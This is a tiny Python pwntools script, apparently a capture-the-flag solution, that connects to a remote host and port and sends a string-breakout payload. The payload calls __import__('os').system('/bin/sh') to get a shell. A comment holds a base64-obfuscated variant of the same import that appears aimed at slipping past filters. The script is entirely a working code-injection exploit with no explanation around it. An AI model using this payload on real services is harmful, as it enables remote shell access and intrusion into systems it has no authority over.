from pwn import *

sh=remote("128.199.104.41",20016)

p='\'+__import__("os").system("/bin/sh")+\''
sh.sendline(p)

# (HrjYMvtxwA(b'X19pbXBvcnRfXw==').decode('utf-8')((HrjYMvtxwA(b'b3M=').decode('utf-8'))

sh.interactive()